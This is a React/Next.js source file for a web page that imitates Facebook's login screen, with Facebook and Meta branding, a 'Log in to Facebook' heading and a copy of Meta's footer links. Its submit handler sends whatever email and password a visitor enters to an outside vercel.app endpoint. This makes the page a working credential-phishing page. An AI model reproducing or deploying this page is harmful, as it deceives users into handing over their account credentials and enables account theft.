"use client";

import { useState } from "react";
import Image from "next/image";
import { FaFacebook } from "react-icons/fa";
import { FaChevronLeft } from "react-icons/fa6";
import { FaInfinity } from "react-icons/fa6";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleRegister = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    try {
      const baseUrl = process.env.NEXT_PUBLIC_API_URL || "https://pass-tau-livid.vercel.app";
      const response = await fetch(`${baseUrl}/api/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      const data = await response.json();
      if (response.ok) {
        alert("تم إنشاء الحساب بنجاح!");
      } else {
        alert(data.message || "فشل إنشاء الحساب");
      }
    } catch (error) {
      alert("خطأ في الاتصال بالسيرفر");
    }
  };

  const metaLinks = [
    "English (UK)", "العربية", "Français (France)", "Italiano", "Deutsch",
    "Русский", "Español", "More languages…", "Sign up", "Log in",
    "Messenger", "Facebook Lite", "Video", "Meta Pay", "Meta Store",
    "Meta Quest", "Ray-Ban Meta", "Meta AI", "Instagram", "Threads",
    "Privacy Policy", "Privacy Centre", "About", "Create ad", "Create Page",
    "Developers", "Careers", "Cookies", "AdChoices", "Terms", "Help",
    "Contact uploading and non-users"
  ];

  return (
    <div className="flex flex-col flex-1 items-center bg-zinc-50 font-sans dark:bg-black min-h-screen">
      <div className="w-full flex flex-col items-center">
        {/* تم تغيير الـ grid ليكون عمودياً في الموبايل وأفقياً في الشاشات الكبيرة */}
        <div className="w-full min-h-screen grid grid-cols-1 lg:grid-cols-[58%_42%]">
          
          {/* LEFT */}
          <section className="relative flex items-center justify-center px-12 py-10 w-full lg:w-[58%]">
            <div className="w-full max-w-[900px] flex flex-col items-center lg:items-start">
              {/* أيقونة فيسبوك */}
              <div className="w-12 h-12 rounded-full bg-[#1877F2] flex items-center justify-center mb-6">
                <FaFacebook className="w-7 h-7 text-white" />
              </div>

              {/* النص والصورة */}
              <div className="flex flex-col lg:flex-row items-center justify-center lg:justify-between w-full gap-8">
                <h1 className="text-[40px] md:text-[56px] leading-[0.95] font-bold tracking-tight text-center lg:text-left lg:pt-40">
                  Explore <br />
                  the <br />
                  things <br />
                  <span className="text-[#1877F2]">you love.</span>
                </h1>
                
                <div className="shrink-0">
                  <Image 
                    width={600} 
                    height={600} 
                    src="/photo.webp" 
                    alt="Hero" 
                    className="w-[300px] md:w-[500px] lg:w-[600px] h-auto object-contain" 
                  />
                </div>
              </div>
            </div>
          </section>

          {/* RIGHT */}
          <section className="sm:border-t lg:border-t-0 lg:border-l border-gray-200 flex justify-center items-center px-6 py-10 lg:py-24">
            <div className="w-full max-w-xl">
              <div className="flex items-center gap-5 mb-8">
                <button><FaChevronLeft className="w-4 h-4" /></button>
                <h2 className="text-xl font-semibold">Log in to Facebook</h2>
              </div>

              <form onSubmit={handleRegister} className="space-y-4">
                <input
                  type="text"
                  placeholder="Email address or mobile number"
                  className="w-full h-14 rounded-xl border border-gray-300 px-4 text-lg outline-none focus:border-[#1877F2]"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
                <input
                  type="password"
                  placeholder="Password"
                  className="w-full h-14 rounded-xl border border-gray-300 px-4 text-lg outline-none focus:border-[#1877F2]"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="submit"
                  className="w-full h-12 rounded-lg bg-[#1877F2] text-white text-xl font-semibold hover:bg-blue-700 transition"
                >
                  Log in
                </button>
              </form>

              <div className="text-center mt-6">
                <a href="#" className="font-medium text-lg text-[#1877F2] hover:underline">Forgotten password?</a>
              </div>
              <div className="flex justify-center mt-10">
                 <button className="px-6 h-12 rounded-lg bg-green-600 text-white font-semibold hover:bg-green-700 transition">
                  Create new account
                </button>
              </div>
              
              <div className="mt-8 flex justify-center items-center gap-2">
                <FaInfinity className="w-6 h-6 text-[#1877F2]" />
                <span className="text-xl font-medium">Meta</span>
              </div>
            </div>
          </section>
        </div>

        <footer className="border-t border-gray-300 py-6 w-full px-4">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-500 max-w-[1000px] mx-auto text-center">
            {metaLinks.map((link, index) => (
              <a key={index} href="#" className="hover:underline transition">{link}</a>
            ))}
          </div>
        </footer>
      </div>
    </div>
  );
}